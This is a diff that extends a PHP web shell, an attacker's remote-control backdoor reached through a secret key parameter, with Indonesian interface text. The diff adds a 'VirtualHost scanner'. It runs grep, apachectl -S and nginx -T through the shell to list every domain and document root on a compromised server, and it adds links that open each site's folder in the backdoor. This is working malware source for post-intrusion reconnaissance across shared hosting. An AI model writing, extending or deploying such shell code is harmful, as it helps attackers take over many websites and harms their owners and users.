@@ -1099,6 +1099,179 @@ if (isset($_GET['action']) && $_GET['action'] === 'scan_shells') {
     exit;
 }
 
+// 🔥 VIRTUALHOST SCANNER - Find domains and document roots
+if (isset($_GET['action']) && $_GET['action'] === 'scan_virtualhosts') {
+    error_reporting(0);
+    ini_set('display_errors', 0);
+    header('Content-Type: application/json');
+    
+    $type = $_GET['server_type'] ?? 'all';
+    $results = ['success' => true, 'apache' => [], 'nginx' => [], 'other' => []];
+    
+    // Apache VirtualHost scanning
+    if ($type === 'apache' || $type === 'all') {
+        $apache_paths = [
+            '/etc/apache2/sites-available',
+            '/etc/apache2/sites-enabled',
+            '/etc/httpd/conf.d',
+            '/etc/httpd/sites-available',
+            '/usr/local/apache2/conf',
+            '/opt/lampp/etc/extra',
+        ];
+        
+        foreach ($apache_paths as $path) {
+            if (is_dir($path)) {
+                $cmd = "grep -r -h -E 'ServerName|DocumentRoot|ServerAlias' " . escapeshellarg($path) . " 2>/dev/null | head -100";
+                $output = execute_shell_command($cmd);
+                if ($output) {
+                    $results['apache'] = array_merge($results['apache'], parseApacheVirtualHosts($output));
+                }
+            }
+        }
+        
+        // Try apachectl/S/httpd -S for configured vhosts
+        $apachectl_cmd = "apachectl -S 2>/dev/null || apache2ctl -S 2>/dev/null || httpd -S 2>/dev/null";
+        $apachectl_output = execute_shell_command($apachectl_cmd);
+        if ($apachectl_output) {
+            $results['apachectl_output'] = $apachectl_output;
+        }
+    }
+    
+    // Nginx VirtualHost scanning
+    if ($type === 'nginx' || $type === 'all') {
+        $nginx_paths = [
+            '/etc/nginx/sites-available',
+            '/etc/nginx/sites-enabled',
+            '/etc/nginx/conf.d',
+            '/usr/local/nginx/conf',
+            '/opt/nginx/conf',
+        ];
+        
+        foreach ($nginx_paths as $path) {
+            if (is_dir($path)) {
+                $cmd = "grep -r -h -E 'server_name|root|listen' " . escapeshellarg($path) . " 2>/dev/null | head -100";
+                $output = execute_shell_command($cmd);
+                if ($output) {
+                    $results['nginx'] = array_merge($results['nginx'], parseNginxVirtualHosts($output));
+                }
+            }
+        }
+        
+        // Try nginx -T for full config dump
+        $nginx_t_cmd = "nginx -T 2>/dev/null | grep -E 'server_name|root|listen' | head -100";
+        $nginx_t_output = execute_shell_command($nginx_t_cmd);
+        if ($nginx_t_output) {
+            $results['nginx'] = array_merge($results['nginx'], parseNginxVirtualHosts($nginx_t_output));
+        }
+    }
+    
+    // LiteSpeed/OpenLiteSpeed scanning
+    if ($type === 'all') {
+        $lsws_paths = [
+            '/usr/local/lsws/conf',
+            '/var/www/conf',
+        ];
+        
+        foreach ($lsws_paths as $path) {
+            if (is_dir($path)) {
+                $cmd = "grep -r -h -E 'vhRoot|configFile|docRoot' " . escapeshellarg($path) . " 2>/dev/null | head -50";
+                $output = execute_shell_command($cmd);
+                if ($output) {
+                    $results['other'][] = ['type' => 'litespeed', 'raw' => $output];
+                }
+            }
+        }
+    }
+    
+    // Remove duplicates
+    $results['apache'] = array_unique($results['apache'], SORT_REGULAR);
+    $results['nginx'] = array_unique($results['nginx'], SORT_REGULAR);
+    
+    echo json_encode($results);
+    exit;
+}
+
+function parseApacheVirtualHosts($output) {
+    $vhosts = [];
+    $lines = explode("\n", $output);
+    $current = null;
+    
+    foreach ($lines as $line) {
+        $line = trim($line);
+        if (empty($line) || strpos($line, '#') === 0) continue;
+        
+        // Match ServerName
+        if (preg_match('/ServerName\s+([^\s]+)/i', $line, $matches)) {
+            $current = ['domain' => $matches[1], 'docroot' => '', 'aliases' => []];
+            $vhosts[] = $current;
+        }
+        // Match ServerAlias
+        elseif (preg_match('/ServerAlias\s+(.+)/i', $line, $matches) && $current !== null) {
+            $aliases = preg_split('/\s+/', trim($matches[1]));
+            $current['aliases'] = array_filter($aliases);
+            // Update last entry
+            if (!empty($vhosts)) {
+                $vhosts[count($vhosts) - 1]['aliases'] = $current['aliases'];
+            }
+        }
+        // Match DocumentRoot
+        elseif (preg_match('/DocumentRoot\s+["\']?([^"\'\s]+)["\']?/i', $line, $matches) && $current !== null) {
+            $current['docroot'] = $matches[1];
+            if (!empty($vhosts)) {
+                $vhosts[count($vhosts) - 1]['docroot'] = $matches[1];
+            }
+        }
+    }
+    
+    return array_filter($vhosts, function($v) {
+        return !empty($v['domain']);
+    });
+}
+
+function parseNginxVirtualHosts($output) {
+    $vhosts = [];
+    $lines = explode("\n", $output);
+    $current = null;
+    $in_server_block = false;
+    
+    foreach ($lines as $line) {
+        $line = trim($line);
+        if (empty($line) || strpos($line, '#') === 0) continue;
+        
+        // Match server_name
+        if (preg_match('/server_name\s+([^;]+);/i', $line, $matches)) {
+            $domains = preg_split('/\s+/', trim($matches[1]));
+            foreach ($domains as $domain) {
+                $domain = trim($domain);
+                if ($domain && $domain !== '_' && strpos($domain, '*') === false) {
+                    $current = ['domain' => $domain, 'docroot' => '', 'listen' => ''];
+                    $vhosts[] = $current;
+                }
+            }
+        }
+        // Match root
+        elseif (preg_match('/root\s+([^;]+);/i', $line, $matches) && $current !== null) {
+            $root = trim($matches[1]);
+            $current['docroot'] = $root;
+            if (!empty($vhosts)) {
+                $vhosts[count($vhosts) - 1]['docroot'] = $root;
+            }
+        }
+        // Match listen
+        elseif (preg_match('/listen\s+([^;]+);/i', $line, $matches) && $current !== null) {
+            $listen = trim($matches[1]);
+            $current['listen'] = $listen;
+            if (!empty($vhosts)) {
+                $vhosts[count($vhosts) - 1]['listen'] = $listen;
+            }
+        }
+    }
+    
+    return array_filter($vhosts, function($v) {
+        return !empty($v['domain']);
+    });
+}
+
 if (isset($_POST['action']) && $_POST['action'] === 'delete_shell') {
     header('Content-Type: application/json');
     $target = $_POST['target'] ?? '';
@@ -2724,7 +2897,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::S Y A L O M:: ~ 270326 2020</h1>
+        <h1>::S Y A L O M:: ~ 270326 2029</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -3248,6 +3421,25 @@ function list_dir($path) {
                 <button id="startScanBtn" onclick="startWebsiteScan()" style="width:100%;padding:12px;background:#0f0;color:#111;font-weight:bold;font-size:14px;">
                     🚀 Mulai Scan
                 </button>
+                
+                <div style="margin-top:15px;padding:12px;background:#2a1f1a;border:1px solid #f80;border-radius:4px;">
+                    <h4 style="margin:0 0 10px 0;color:#f80;font-size:12px;">🌐 VirtualHost Scanner</h4>
+                    <p style="font-size:10px;color:#888;margin:0 0 10px 0;">
+                        Temukan domain & document root dari konfigurasi Apache/Nginx
+                    </p>
+                    <div style="display:flex;gap:5px;margin-bottom:8px;">
+                        <button onclick="scanVirtualHosts('apache')" style="flex:1;padding:8px;background:#f80;color:#111;font-size:11px;font-weight:bold;">
+                            🔍 Apache
+                        </button>
+                        <button onclick="scanVirtualHosts('nginx')" style="flex:1;padding:8px;background:#0f0;color:#111;font-size:11px;font-weight:bold;">
+                            🔍 Nginx
+                        </button>
+                    </div>
+                    <button onclick="scanVirtualHosts('all')" style="width:100%;padding:8px;background:#6cf;color:#111;font-size:11px;font-weight:bold;">
+                        🔍 Scan All Web Servers
+                    </button>
+                </div>
+                
                 <div id="scanStats" style="margin-top:15px;padding:10px;background:#1a1a1a;border-radius:4px;font-size:11px;color:#888;display:none;">
                     <div>⏰ Waktu: <span id="scanTime">0s</span></div>
                     <div>🔍 Ditemukan: <span id="scanCount">0</span></div>
@@ -4360,6 +4552,190 @@ function startWebsiteScan() {
                 '</div>';
         });
 }
+
+// 🔥 VIRTUALHOST SCANNER - Find Apache/Nginx domains
+try {
+    scanVirtualHosts = async function(serverType) {
+        const content = document.getElementById('websiteDiscoverContent');
+        const statsDiv = document.getElementById('scanStats');
+        
+        content.innerHTML = '<div style="padding: 30px; text-align: center;">' +
+            '<div style="font-size: 40px; margin-bottom: 15px;">🔍</div>' +
+            '<div style="color: #6cf; font-size: 16px; margin-bottom: 10px;">Scanning ' + (serverType === 'all' ? 'All Web Servers' : serverType.toUpperCase()) + '...</div>' +
+            '<div style="color: #888; font-size: 12px;">Mencari konfigurasi VirtualHost...</div>' +
+            '<div style="margin-top: 20px; color: #666; font-size: 11px;">Path: /etc/apache2/sites-available /etc/nginx/sites-enabled</div>' +
+            '</div>';
+        
+        statsDiv.style.display = 'block';
+        document.getElementById('scanStatus').textContent = 'Scanning VirtualHosts...';
+        
+        try {
+            const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=scan_virtualhosts&server_type=' + serverType);
+            const data = await response.json();
+            
+            if (!data.success) {
+                throw new Error('Scan failed');
+            }
+            
+            // Combine all results
+            let allVhosts = [];
+            
+            if (data.apache && data.apache.length > 0) {
+                data.apache.forEach(vhost => {
+                    allVhosts.push({
+                        domain: vhost.domain,
+                        docroot: vhost.docroot,
+                        aliases: vhost.aliases || [],
+                        server: 'Apache',
+                        listen: vhost.listen || '80/443'
+                    });
+                });
+            }
+            
+            if (data.nginx && data.nginx.length > 0) {
+                data.nginx.forEach(vhost => {
+                    allVhosts.push({
+                        domain: vhost.domain,
+                        docroot: vhost.docroot,
+                        aliases: [],
+                        server: 'Nginx',
+                        listen: vhost.listen || '80'
+                    });
+                });
+            }
+            
+            // Remove duplicates by domain
+            const seen = new Set();
+            allVhosts = allVhosts.filter(vhost => {
+                const duplicate = seen.has(vhost.domain);
+                seen.add(vhost.domain);
+                return !duplicate;
+            });
+            
+            // Update stats
+            document.getElementById('scanCount').textContent = allVhosts.length;
+            document.getElementById('scanStatus').textContent = 'Selesai!';
+            
+            if (allVhosts.length === 0) {
+                content.innerHTML = '<div style="padding: 30px; text-align: center;">' +
+                    '<div style="font-size: 40px; margin-bottom: 15px;">📭</div>' +
+                    '<div style="color: #f44; font-size: 16px; margin-bottom: 10px;">Tidak ditemukan VirtualHost</div>' +
+                    '<div style="color: #888; font-size: 12px;">Mungkin web server tidak terinstall atau path berbeda</div>' +
+                    '</div>';
+                return;
+            }
+            
+            // Render results
+            renderVirtualHostResults(allVhosts, content);
+            
+        } catch (error) {
+            content.innerHTML = '<div style="color: #f44; padding: 20px; text-align: center;">' +
+                '<p>❌ Error: ' + escapeHtml(error.message) + '</p>' +
+                '<p style="font-size: 11px; color: #666; margin-top: 10px;">Pastikan Anda memiliki akses ke konfigurasi web server</p>' +
+                '</div>';
+        }
+    };
+} catch (e) {
+    // Function already defined
+}
+
+function renderVirtualHostResults(vhosts, content) {
+    // Sort by server type then domain
+    vhosts.sort((a, b) => {
+        if (a.server !== b.server) return a.server.localeCompare(b.server);
+        return a.domain.localeCompare(b.domain);
+    });
+    
+    const apacheCount = vhosts.filter(v => v.server === 'Apache').length;
+    const nginxCount = vhosts.filter(v => v.server === 'Nginx').length;
+    
+    let html = `<div style="background: linear-gradient(135deg, #0f0, #0a0); color: #000; padding: 15px; border-radius: 4px; margin-bottom: 15px; text-align: center;">`;
+    html += `<strong style="font-size: 16px;">🌐 ${vhosts.length} VirtualHost Ditemukan!</strong>`;
+    html += `<div style="font-size: 12px; margin-top: 8px;">`;
+    if (apacheCount > 0) html += `<span style="margin-right: 15px;">🔴 Apache: ${apacheCount}</span>`;
+    if (nginxCount > 0) html += `<span>🟢 Nginx: ${nginxCount}</span>`;
+    html += `</div></div>`;
+    
+    // Group by server type
+    const grouped = {};
+    vhosts.forEach(vhost => {
+        if (!grouped[vhost.server]) grouped[vhost.server] = [];
+        grouped[vhost.server].push(vhost);
+    });
+    
+    // Render each group
+    Object.keys(grouped).forEach(serverType => {
+        const serverVhosts = grouped[serverType];
+        const serverColor = serverType === 'Apache' ? '#f80' : '#0f0';
+        const serverIcon = serverType === 'Apache' ? '🔴' : '🟢';
+        
+        html += `<div style="margin-bottom: 20px;">`;
+        html += `<div style="background: #1a1a1a; padding: 10px 15px; border-left: 4px solid ${serverColor}; margin-bottom: 10px;">`;
+        html += `<strong style="color: ${serverColor}; font-size: 14px;">${serverIcon} ${serverType} (${serverVhosts.length})</strong>`;
+        html += `</div>`;
+        
+        serverVhosts.forEach((vhost, index) => {
+            const encodedPath = encodeURIComponent(vhost.docroot);
+            const shellUrl = window.location.pathname + '?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodedPath;
+            const webUrl = 'http://' + vhost.domain;
+            const hasDocroot = vhost.docroot && vhost.docroot !== '';
+            
+            html += `<div style="background: #111; border: 1px solid #333; border-radius: 4px; padding: 12px; margin-bottom: 8px;">`;
+            
+            // Header with domain and badges
+            html += `<div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 8px;">`;
+            html += `<div style="flex: 1;">`;
+            html += `<div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">`;
+            html += `<span style="color: #6cf; font-weight: bold;">#${index + 1}</span>`;
+            html += `<a href="${webUrl}" target="_blank" style="color: #0f0; font-weight: bold; font-size: 14px; text-decoration: none;" title="Buka website di tab baru">`;
+            html += `🌐 ${escapeHtml(vhost.domain)}`;
+            html += `</a>`;
+            html += `<span style="background: ${serverColor}; color: #000; padding: 2px 8px; border-radius: 3px; font-size: 10px; font-weight: bold;">${serverType}</span>`;
+            if (vhost.listen) {
+                html += `<span style="background: #333; color: #888; padding: 2px 8px; border-radius: 3px; font-size: 10px;">Port: ${vhost.listen}</span>`;
+            }
+            html += `</div>`;
+            html += `</div>`;
+            html += `</div>`;
+            
+            // Document Root
+            if (hasDocroot) {
+                html += `<div style="margin-top: 8px; padding: 8px; background: #0a0a0a; border-radius: 3px;">`;
+                html += `<div style="font-size: 10px; color: #888; margin-bottom: 4px;">📁 Document Root:</div>`;
+                html += `<a href="${shellUrl}" target="_blank" style="color: #6cf; font-family: monospace; font-size: 12px; text-decoration: none; word-break: break-all;" title="Buka folder di shell baru">`;
+                html += `➜ ${escapeHtml(vhost.docroot)}`;
+                html += `</a>`;
+                html += `</div>`;
+            } else {
+                html += `<div style="margin-top: 8px; padding: 8px; background: #2a0000; border-radius: 3px; color: #f44; font-size: 11px;">`;
+                html += `⚠️ Document root tidak ditemukan`;
+                html += `</div>`;
+            }
+            
+            // Aliases (for Apache)
+            if (vhost.aliases && vhost.aliases.length > 0) {
+                html += `<div style="margin-top: 6px; font-size: 10px; color: #888;">`;
+                html += `📎 Aliases: ${vhost.aliases.map(a => '<span style="color: #ff0;">' + escapeHtml(a) + '</span>').join(', ')}`;
+                html += `</div>`;
+            }
+            
+            // Quick actions
+            html += `<div style="margin-top: 10px; display: flex; gap: 8px; flex-wrap: wrap;">`;
+            html += `<a href="${webUrl}" target="_blank" style="background: #0f0; color: #000; padding: 4px 12px; border-radius: 3px; font-size: 11px; text-decoration: none; font-weight: bold;">🌐 Buka Web</a>`;
+            if (hasDocroot) {
+                html += `<a href="${shellUrl}" target="_blank" style="background: #6cf; color: #000; padding: 4px 12px; border-radius: 3px; font-size: 11px; text-decoration: none; font-weight: bold;">📁 Buka Folder</a>`;
+            }
+            html += `</div>`;
+            
+            html += `</div>`;
+        });
+        
+        html += `</div>`;
+    });
+    
+    content.innerHTML = html;
+}
+
 function navigateToDir(path) {
     window.location.href = '?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodeURIComponent(path);
 }
